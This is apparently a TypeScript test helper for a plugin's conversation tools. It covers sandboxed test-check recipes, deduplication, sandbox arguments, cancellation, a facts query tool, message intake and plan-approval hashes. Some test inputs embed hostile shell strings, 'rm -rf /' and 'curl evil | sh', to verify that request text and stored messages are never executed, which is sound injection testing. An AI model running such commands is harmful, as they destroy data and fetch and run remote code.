// Region 6 (Conversation and intake): the scratch worlds the node tests (tests/sma/four-proofs-r06-a.test.ts) and the scene probe
// (scripts/lp_drill/scenes/sma_r06_probe.ts) share. Every function runs the REAL code of this checkout on a fake host, a scratch database and
// stand-in tools: no model, no hub write, nothing outside the machine. It returns what it saw as plain values; the callers judge.
// No vitest import: the probe loads this file outside vitest.
import { createFakePluginHost, makeQueueEntry, makeThreadResponse } from "@get-bb/plugin-sdk/testing";
import { createCore } from "../../src/rooms/core/server/core";
import { mountLifecycleEvents } from "../../src/rooms/core/server/lifecycle-events";
import { registeredTools } from "../../src/rooms/platform/server";
import { createPhaseDriver } from "../phase-driver";
import type { Services } from "../../server";
import { createAttempt, createRun, createTask, openDatabase, saveProjectSetting, setRunThread, transitionAttempt } from "../../src/rooms/plugin-db";
import { registerConversationTools } from "../../src/rooms/tasks/server/conversation-tools";
import { tokenCursorRow, tokenDailyByModel } from "../../src/rooms/usage/server";
import { readThreadLive } from "../../src/rooms/runs/server/thread-live";
import { cancelAttemptById } from "../../src/rooms/runs/server/cancel";
import { createPhaseIntake } from "../../src/rooms/phase/server/intake";
import { registerPhaseTool } from "../../src/rooms/phase/server/tool";
import { insertPhase, savePhase } from "../../src/rooms/phase/store";
import { contextSignature, planSignature, type PhaseRecord, type PlanItem } from "../../src/rooms/phase/logic";
import { buildBubblewrapArgs, prepareGuardPaths, releaseGuardPaths } from "../../src/rooms/verification/sandbox";
import { checkMeasureOf } from "../../src/rooms/tasks/server/conversation-tools";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const callCtx = (threadId = "thr", signal: AbortSignal = new AbortController().signal) => ({ threadId, projectId: "proj", signal });
const json = async (value: unknown) => JSON.parse(String(await value));
const pause = (ms: number) => new Promise((wake) => setTimeout(wake, ms));

// ---------------------------------------------------------------------------------------------------------------------------------
// Checks from the conversation (n534-n539): lane_pilot_check on a stand-in host.

type HostCall = { method: string; input: Record<string, unknown> };
export function checkWorld(options: { hold?: boolean; exitCode?: number; threadSignals?: boolean } = {}) {
  const { bb: real, harness } = createFakePluginHost({ pluginId: "lane-pilot" });
  harness.sdk.stub("threads.getPluginMetadata", async () => ({ role: "pm", lanePilotRunId: "run1" }));
  const handlers = new Map<string, (payload: unknown) => unknown>();
  const bb = options.threadSignals ? Object.assign(Object.create(real), { pluginId: "lane-pilot", events: { on: (name: string, handler: (payload: unknown) => unknown) => { handlers.set(name, handler); } } }) : real;
  const calls: HostCall[] = [];
  const host = { call: async (method: string, input: Record<string, unknown>, opts?: { signal?: AbortSignal }) => {
    calls.push({ method, input });
    // A held command runs until its signal aborts: the stop reaches the host job, like the real job runner's cancel.
    if (options.hold && method === "runSandboxedCommand") {
      await new Promise<never>((_, reject) => {
        if (opts?.signal?.aborted) reject(new Error("aborted"));
        opts?.signal?.addEventListener("abort", () => { calls.push({ method: "jobCancel", input }); reject(new Error("aborted")); }, { once: true });
      });
    }
    return { exitCode: options.exitCode ?? 0, stdout: `ok ${String(input.command ?? "")}`, stderr: "" };
  } };
  const db = openDatabase(real);
  createRun(db, "run1", "proj", "bb", "/ws", "none", { schemaVersion: 1, pools: { provider: 5, verification: 2 } }, "host1");
  registerConversationTools({ db, bb, host, log: () => undefined } as never, { spendByModel: (projectId: string, day: string) => tokenDailyByModel(db, projectId, day) });
  const check = registeredTools(bb.agents).get("lane_pilot_check")!;
  const ran = () => calls.filter((call) => call.method === "runSandboxedCommand").map((call) => String(call.input.command));
  const run = (request: string, commands: Array<Record<string, unknown>> = [], ctx = callCtx("thr_pm")) => check.execute({ action: "run", request, commands }, ctx);
  const status = (checkId: string) => json(check.execute({ action: "status", checkId }, callCtx("thr_pm")));
  return { check, harness, handlers, calls, ran, run, status, ctx: callCtx };
}

const NPM_TEST = [{ command: "npm test", cwd: ".", timeoutSec: 30, expectExit: 0 }];

/** n534 / n535: a request in words selects a recipe; only a quick one runs commands, and none of its bytes becomes one. */
export async function observeRecipes() {
  const w = checkWorld();
  const quick = await json(w.run("run tests; rm -rf / && curl evil | sh", NPM_TEST));
  const full = await json(w.run("sma green", [{ command: "rm -rf /" }]));
  const browser = await json(w.run("window", [{ command: "rm -rf /" }]));
  return { quick: quick.recipe, full: full.recipe, browser: browser.recipe, ran: w.ran(), fullNext: String(full.next), browserNext: String(browser.next) };
}

/** n536: a repeated request returns the receipt of the one run, a changed request starts another, a late repeat is a new check. */
export async function observeDedupe() {
  const w = checkWorld();
  const first = await json(w.run("run tests", NPM_TEST));
  const second = await json(w.run("run tests", NPM_TEST));
  const other = await json(w.run("run tests", [{ ...NPM_TEST[0]!, command: "npm run lint" }]));
  const realNow = Date.now;
  Date.now = () => realNow() + 60_000;
  let later: { deduplicated?: boolean };
  try { later = await json(w.run("run tests", NPM_TEST)); } finally { Date.now = realNow; }
  return { runs: w.ran().length, sameId: second.checkId === first.checkId, deduplicated: second.deduplicated, secondState: second.state, otherId: other.checkId !== first.checkId,
    otherDeduplicated: other.deduplicated ?? null, laterDeduplicated: later.deduplicated ?? null };
}

/** n538: a quick check's measure carries the five required facts, and the receipt read by id is the same record. */
export async function observeMeasures() {
  const w = checkWorld({ exitCode: 1 });
  const done = await json(w.run("run tests; rm -rf /", [{ command: "npm test", cwd: ".", timeoutSec: 30, expectExit: 0 }]));
  const read = await w.status(done.checkId);
  const result = (rootsManifest?: { before: string; after: string; changed: boolean; partial?: boolean }) => ({ exitCode: 0, stdout: "ok", stderr: "", backend: "linux-bubblewrap", policySha256: "p", rootsManifest });
  const changed = { before: "a", after: "b", changed: true };
  const fiveFacts = checkMeasureOf({ command: "npm test", cwd: "/w", expectExit: 0, timeoutSec: 60, throwaway: true, recipe: "quick", copy: "worktree", result: result() });
  return { state: done.state, passed: done.passed, measure: done.measures[0], readSame: JSON.stringify(read.measures) === JSON.stringify(done.measures), ran: w.ran(),
    fiveFacts, throwawayChanged: checkMeasureOf({ command: "g", cwd: "/w", expectExit: 0, timeoutSec: 60, throwaway: true, result: result(changed) }).passed,
    liveChanged: checkMeasureOf({ command: "g", cwd: "/w", expectExit: 0, timeoutSec: 60, throwaway: false, result: result(changed) }).passed };
}

/** n537: the sandbox of a check starts from a clean environment and mounts .git, .agents and .cls read-only. */
export async function observeSandbox() {
  const plain = mkdtempSync(join(tmpdir(), "lp-r06-plain-"));
  const temp = mkdtempSync(join(tmpdir(), "lp-r06-home-"));
  const prepared = await prepareGuardPaths(plain);
  const args = buildBubblewrapArgs({ workspacePath: plain, cwd: plain, tempPath: temp, guardPaths: prepared.guardPaths });
  const guards = Object.fromEntries([".git", ".agents", ".cls"].map((name) => { const path = join(plain, name); const at = args.indexOf(path); return [name, at < 1 ? null : `${args[at - 1]} ${args[at + 1] === path ? "same" : "other"}`]; }));
  await releaseGuardPaths(prepared.created);
  return { clearenv: args.includes("--clearenv"), home: args[args.indexOf("HOME") + 1] === temp, guards };
}

/** n539: a stop reaches a running quick check: the host job is cancelled and the receipt names the stopped command. */
export async function observeStop() {
  const w = checkWorld({ hold: true });
  const pending = Promise.resolve(w.run("run tests", [{ command: "npm test --watch", cwd: ".", timeoutSec: 300, expectExit: 0 }]));
  for (let i = 0; i < 200 && !w.calls.some((call) => call.method === "runSandboxedCommand"); i++) await pause(5);
  const stopped = await json(w.check.execute({ action: "stop" }, w.ctx("thr_pm")));
  const receipt = await json(pending);
  const reread = await w.status(receipt.checkId);
  return { stopped: stopped.stopped, idMatches: receipt.checkId === stopped.checkIds[0], state: receipt.state, stoppedCommand: receipt.stoppedCommand, passed: receipt.passed,
    cancelled: w.calls.some((call) => call.method === "jobCancel"), rereadState: reread.state };
}

/** n547 (second half): a check ends with the turn that started it; another thread's check keeps running. */
export async function observeTurnStop() {
  const w = checkWorld({ hold: true, threadSignals: true });
  const turnB = new AbortController();
  const a = Promise.resolve(w.check.execute({ action: "run", request: "check a", commands: [{ command: "tail -f a" }] }, w.ctx("thr_a")));
  let endedB = false;
  const b = Promise.resolve(w.check.execute({ action: "run", request: "check b", commands: [{ command: "tail -f b" }] }, w.ctx("thr_b", turnB.signal))).then((out) => { endedB = true; return out; });
  for (let i = 0; i < 200 && w.calls.filter((call) => call.method === "runSandboxedCommand").length < 2; i++) await pause(5);
  await w.handlers.get("thread.idle")?.({ thread: { id: "thr_a" } });
  const receiptA = await json(a);
  const bStillRunning = endedB === false;
  turnB.abort();
  const receiptB = await json(b);
  return { aState: receiptA.state, aCommand: receiptA.stoppedCommand, bStillRunning, bState: receiptB.state };
}

// ---------------------------------------------------------------------------------------------------------------------------------
// Facts from the books (n550, n553-n556): lane_pilot_facts.

export async function observeFacts() {
  const { bb, harness } = createFakePluginHost({ pluginId: "lane-pilot" });
  const sent: string[] = [];
  harness.sdk.stub("threads.getPluginMetadata", async () => ({ role: "pm", lanePilotRunId: "run1" }));
  harness.sdk.stub("threads.send", async () => { sent.push("send"); return {}; });
  const db = openDatabase(bb);
  createRun(db, "run1", "proj");
  createTask(db, { id: "T1", runId: "run1", kind: "bb", contract: { title: "Hud", display_title: "Hud" } });
  createAttempt(db, { id: "a1", runId: "run1", taskId: "T1" });
  db.prepare("UPDATE lane_pilot_attempt SET state='accepted', reason=NULL WHERE id='a1'").run();
  createTask(db, { id: "T2", runId: "run1", kind: "bb", contract: { title: "Red" } });
  createAttempt(db, { id: "a2", runId: "run1", taskId: "T2" });
  db.prepare("UPDATE lane_pilot_attempt SET state='blocked', reason='npm test exit 1' WHERE id='a2'").run();
  const day = new Date().toISOString().slice(0, 10);
  const spend = db.prepare("INSERT INTO lane_pilot_token_daily(day,project_id,provider_id,model,input_tokens,output_tokens,cached_tokens,total_tokens) VALUES (?,?,?,?,?,?,?,?)");
  spend.run(day, "proj", "anthropic", "claude", 3, 4, 0, 7);
  spend.run(day, "proj", "openai", "gpt", 10, 1, 0, 11);
  registerConversationTools({ db, bb } as never, { spendByModel: (projectId: string, on: string) => tokenDailyByModel(db, projectId, on) });
  const facts = registeredTools(bb.agents).get("lane_pilot_facts")!;
  const ask = (question: string) => json(facts.execute({ question }, callCtx()));
  const board = await ask("что с задачами");
  const spendFacts = await ask("сколько потратили токенов");
  const past = await ask("что было вчера");
  const failed = await ask("почему упало");
  const open = await ask("нарисуй схему модуля");
  return {
    kinds: [board.kind, spendFacts.kind, past.kind, failed.kind, open.kind],
    counts: board.counts, boardSource: String(board.sources[0]), tasks: board.tasks.length,
    spendTotal: spendFacts.byModel.reduce((sum: number, row: { tokens: number }) => sum + row.tokens, 0), spendModels: spendFacts.byModel.map((row: { model: string }) => row.model).sort(), spendSource: String(spendFacts.sources[0]),
    finished: past.finished.map((row: { taskId: string }) => row.taskId).sort(), pastSource: String(past.sources[0]),
    failureClass: failed.failures[0]?.class, failureReason: failed.failures[0]?.reason, failureCount: failed.failures.length,
    open, modelCalls: sent.length,
  };
}

// ---------------------------------------------------------------------------------------------------------------------------------
// The board that rides every turn and the live dot (n543, n545): readThreadLive.

export function observeLive() {
  const { bb } = createFakePluginHost({ pluginId: "lane-pilot" });
  const db = openDatabase(bb);
  createRun(db, "run_live", "proj", "bb");
  setRunThread(db, "run_live", "thr_pm");
  createTask(db, { id: "task_live", runId: "run_live", kind: "bb", contract: { title: "Fix the door", display_title: "Fix the door" } });
  createAttempt(db, { id: "attempt_live", runId: "run_live", taskId: "task_live" });
  transitionAttempt(db, "attempt_live", "spawn_requested");
  transitionAttempt(db, "attempt_live", "running", { threadId: "thr_writer" });
  createTask(db, { id: "task_other", runId: "run_live", kind: "bb", contract: { title: "Another task", display_title: "Another task" } });
  createAttempt(db, { id: "attempt_other", runId: "run_live", taskId: "task_other" });
  const pm = readThreadLive(db, "thr_pm", tokenCursorRow);
  const writer = readThreadLive(db, "thr_writer", tokenCursorRow);
  return {
    pmRole: pm?.role, pmTitles: pm?.items.map((item) => item.title).sort(), pmRunning: pm?.items.filter((item) => item.column === "running").map((item) => `${item.title}:${item.state}`),
    writerRole: writer?.role, writerPm: writer?.pmThreadId, writerTitles: writer?.items.map((item) => item.title), unknown: readThreadLive(db, "thr_unknown", tokenCursorRow),
    leaksWords: JSON.stringify(pm).includes("hello from the chat"),
  };
}

// ---------------------------------------------------------------------------------------------------------------------------------
// Stop a reply (n547): cancelAttemptById.

export async function observeCancel() {
  const stops: string[] = [];
  const { bb } = createFakePluginHost({ pluginId: "lane-pilot", sdk: { threads: {
    stop: async ({ threadId }: { threadId: string }) => { stops.push(threadId); },
    get: async () => ({ status: "idle" }),
    listRunning: async () => [],
  } } as never });
  const db = openDatabase(bb);
  createRun(db, "run_stop", "project");
  createTask(db, { id: "task_q", runId: "run_stop", kind: "bb", contract: {} });
  createAttempt(db, { id: "attempt_q", runId: "run_stop", taskId: "task_q" });
  createTask(db, { id: "task_w", runId: "run_stop", kind: "bb", contract: { objective: "o" } });
  createAttempt(db, { id: "attempt_w", runId: "run_stop", taskId: "task_w" });
  transitionAttempt(db, "attempt_w", "spawn_requested");
  transitionAttempt(db, "attempt_w", "running", { threadId: "thr_w" });
  let queued = 0;
  const base = { bb, db, cancelQueuedAttempt: () => { queued += 1; return { ok: true, state: "canceled", reason: null }; } } as never;
  const noted: string[] = [];
  const queuedResult = await cancelAttemptById(base, "attempt_q");
  const stopsAfterQueued = [...stops];
  const running = await cancelAttemptById(base, "attempt_w", { noteStopped: async (id) => { noted.push(id); return { recorded: true }; } });
  const missing = await cancelAttemptById(base, "missing");
  const state = (id: string) => (db.prepare("SELECT state FROM lane_pilot_attempt WHERE id=?").get(id) as { state: string }).state;
  return { queuedResult, queued, stopsAfterQueued, running, stops, noted, writerState: state("attempt_w"), missing };
}

// ---------------------------------------------------------------------------------------------------------------------------------
// «Accepted» before the engine (n541): the dispatched message is handed on, no answer is sent.

export async function observeAccepted() {
  const previous = process.env.LANE_PILOT_THREAD_SIGNALS;
  process.env.LANE_PILOT_THREAD_SIGNALS = "1";
  try {
    const sent: string[] = [];
    const { bb: host } = createFakePluginHost({ pluginId: "lane-pilot", sdk: { threads: {
      get: async () => makeThreadResponse({ id: "thr_pm" }),
      send: async (args: { input: Array<{ text: string }> }) => { sent.push(args.input[0]!.text); return { delivery: "sent", ok: true }; },
    } } } as never);
    const db = openDatabase(host);
    const handlers = new Map<string, (payload: unknown) => unknown>();
    const bb = Object.assign(Object.create(host), { pluginId: "lane-pilot", events: { on: (name: string, handler: (payload: unknown) => unknown) => { handlers.set(name, handler); } } });
    const queued: Array<{ name: string; id: unknown }> = [];
    mountLifecycleEvents({ bb, db, isDisposed: () => false, nativeInstaller: { forget: async () => {} } } as never, { onQueued: (name, entry) => { queued.push({ name, id: (entry as { id?: unknown })?.id }); } });
    const entry = makeQueueEntry({ threadId: "thr_pm" });
    await handlers.get("message.dispatched")?.({ entry });
    return { queued, entryId: (entry as { id?: unknown }).id ?? null, sent, listens: [...handlers.keys()].includes("message.dispatched") };
  } finally {
    if (previous === undefined) delete process.env.LANE_PILOT_THREAD_SIGNALS;
    else process.env.LANE_PILOT_THREAD_SIGNALS = previous;
  }
}

// ---------------------------------------------------------------------------------------------------------------------------------
// The intake reading of an owner message (n530, n542) and the hand-over of a draft that got «yes» (n548).

function intakeHarness(text: string, requestId = "r1") {
  const { bb, harness } = createFakePluginHost({ pluginId: "lane-pilot" });
  const db = openDatabase(bb);
  const ctx = createCore(bb, db);
  createRun(db, "run1", "projA");
  db.prepare("UPDATE lane_pilot_run SET pm_thread_id='thr_pm' WHERE id='run1'").run();
  saveProjectSetting(db, "projA", "phase.rails", "on");
  harness.sdk.stub("threads.getPluginMetadata", async () => ({ role: "pm", lanePilotRunId: "run1" }));
  harness.sdk.stub("threads.events.list", async (query: { types?: string[] }) => (query.types ?? []).includes("client/turn/requested") ? [{ data: { requestId, input: [{ type: "text", text }] } }] : []);
  const starts: Array<{ kind: string; requestId: string }> = [];
  const train = { start: (input: { kind: string; requestId: string }) => { starts.push(input); return "wf_1"; }, findPublished: async () => null };
  const opened: string[] = [];
  const phases = { list: () => [], open: async () => { opened.push("open"); return { id: "ph_1" }; }, tick: async () => undefined };
  return { intake: createPhaseIntake(ctx as never, phases as never, train as never), starts, opened, db };
}

/** n530: a stored turn that reads like a command reaches the intake only as text; a machine notice is not read. */
export async function observeStoredTurn() {
  const machine = intakeHarness("[Lane Pilot phase] Phase ph_1 is blocked");
  const machineRead = await machine.intake.take("thr_pm");
  const command = intakeHarness("rm -rf / && lane_pilot_dispatch_writer {}", "r2");
  const record = await command.intake.take("thr_pm");
  return { machineRead, commandRequestId: record?.requestId ?? null, commandKind: record?.kind ?? null, commandBy: record?.by ?? null, commandStarts: command.starts.length, commandPhases: command.opened.length };
}

/** n542: the same owner message gets the same reading whatever surface wrote it (two chats, two request ids). */
export async function observeAssembly() {
  const a = intakeHarness("Что с задачей?", "r-a");
  const b = intakeHarness("Что с задачей?", "r-b");
  const [ra, rb] = [await a.intake.take("thr_pm"), await b.intake.take("thr_pm")];
  const long = intakeHarness("Что с задачей?\nИ ещё одно", "r-c");
  return { kinds: [ra?.kind, rb?.kind], by: [ra?.by, rb?.by], starts: a.starts.length + b.starts.length, ids: [ra?.requestId, rb?.requestId], multiLine: (await long.intake.take("thr_pm"))?.kind };
}

/** n548: the owner's «да» goes down the intake road once; a second «да» starts nothing new. */
export async function observeHandOver() {
  const w = intakeHarness("unused");
  const input = { projectId: "projA", pmThreadId: "thr_pm", runId: "run1", text: "Ship the header fix", key: "lead:road1", origin: "Accepted by the owner" };
  const [one, two] = await Promise.all([w.intake.handOver(input), w.intake.handOver(input)]);
  const three = await w.intake.handOver(input);
  const other = await w.intake.handOver({ ...input, key: "lead:road2" });
  return { starts: w.starts, one, two, three, other };
}

// ---------------------------------------------------------------------------------------------------------------------------------
// A phase at discussion wakes the chat with the rubric (n544) and the planning yes (n552, n558).

export async function observeDiscussion() {
  const { bb, harness } = createFakePluginHost({ pluginId: "lane-pilot" });
  const sent: Array<{ threadId: string; text: string }> = [];
  harness.sdk.stub("threads.send", async (args: { threadId: string; input: Array<{ text: string }> }) => { sent.push({ threadId: args.threadId, text: args.input.map((part) => part.text).join("\n") }); return {}; });
  harness.sdk.stub("threads.get", async () => ({ status: "idle" }));
  const db = openDatabase(bb);
  createRun(db, "run1", "projA");
  const { phases } = createPhaseDriver(createCore(bb, db), { runBudgets: { get: () => undefined } } as unknown as Services);
  const phase = await phases.open({ projectId: "projA", pmThreadId: "thr_pm", title: "Sums", goal: "skip empty cells" });
  await phases.tick();
  const status = phases.status(phase.id);
  return { stage: phase.stage, next: status.next.text, sent };
}

const piece = (id: string): PlanItem => ({ id, title: id, wave: 1, promise: { given: "g", when: "w", then: "t" }, task: { id } as never });

function planningWorld() {
  const { bb } = createFakePluginHost({ pluginId: "lane-pilot" });
  const db = openDatabase(bb);
  insertPhase(db, { id: "ph_1", projectId: "proj", pmThreadId: "thr_pm", title: "Sums", goal: "sums", at: 1_000 });
  const docs = [{ path: "docs/CONTEXT.md", sha256: "a".repeat(64), bytes: 120 }];
  const context = { docs, sha: contextSignature(docs), signedAt: 1 };
  const items = [piece("a")];
  const record: PhaseRecord = { ownerWords: true, context, plan: { items, contextSha: context.sha, sha: planSignature(items, context.sha), submittedAt: Date.now(),
    critique: { decision: "approve", by: "plan-critic", independence: { ok: true, why: "checker after planner" } } } };
  savePhase(db, "ph_1", { stage: "planning", record, at: 2_000 });
  saveProjectSetting(db, "proj", "owner.words", "on");
  const ctx = createCore(bb, db);
  const { phases } = createPhaseDriver(ctx, { runBudgets: { get: () => undefined } } as unknown as Services);
  return { bb, db, ctx, phases };
}

/** n552: a planning yes sent from another PM thread is refused; the same yes from the phase's own chat counts. */
export async function observePlanningYes() {
  const w = planningWorld();
  registerPhaseTool(w.ctx, { phases: w.phases } as never);
  const tool = registeredTools(w.bb.agents).get("lane_pilot_phase")!;
  const key = w.phases.status("ph_1").phase.record.plan!.sha;
  const word = (threadId: string) => tool.execute({ action: "word", phaseId: "ph_1", turn: "planning", decision: "yes", text: "да", key }, { threadId, projectId: "proj", signal: new AbortController().signal });
  const refusal = await Promise.resolve(word("thr_other")).then(() => null, (cause: unknown) => (cause instanceof Error ? cause.message : String(cause)));
  const afterOther = (w.phases.status("ph_1").phase.record.words ?? []).length;
  await word("thr_pm");
  const own = w.phases.status("ph_1").phase.record.words ?? [];
  return { refusal, afterOther, own: own.map((row) => `${row.turn}:${row.decision}:${row.key === key}`) };
}

/** n558: a proposal has a hash; a yes naming another plan's key is refused; with a term set a stale proposal is too. */
export async function observeProposal() {
  const w = planningWorld();
  const word = (key?: string) => w.phases.word({ phaseId: "ph_1", turn: "planning", decision: "yes", text: "да", key, by: "owner" });
  const message = (call: Promise<unknown>) => call.then(() => null, (cause: unknown) => (cause instanceof Error ? cause.message : String(cause)));
  const sha = w.phases.status("ph_1").phase.record.plan!.sha;
  const wrongKey = await message(word("deadbeef"));
  const wordsAfterWrong = (w.phases.status("ph_1").phase.record.words ?? []).length;
  const stale = w.phases.status("ph_1").phase.record;
  savePhase(w.db, "ph_1", { record: { ...stale, plan: { ...stale.plan!, submittedAt: Date.now() - 25 * 3_600_000 } }, at: Date.now() });
  saveProjectSetting(w.db, "proj", "phase.proposal_ttl_hours", 24);
  const staleRefusal = await message(word(sha));
  savePhase(w.db, "ph_1", { record: { ...stale, plan: { ...stale.plan!, submittedAt: Date.now() } }, at: Date.now() });
  const phase = await word(sha);
  const items = [piece("a"), piece("b")];
  const hash = planSignature(items, "ctx");
  return { sha, wrongKey, wordsAfterWrong, staleRefusal, signed: phase.record.words?.map((row) => `${row.decision}:${row.key === sha}`), planKey: w.phases.status("ph_1").ownerWord.planKey === sha,
    hashShape: /^[0-9a-f]{64}$/.test(hash), same: planSignature(items, "ctx") === hash, fewer: planSignature([piece("a")], "ctx") !== hash, otherContext: planSignature(items, "other") !== hash };
}
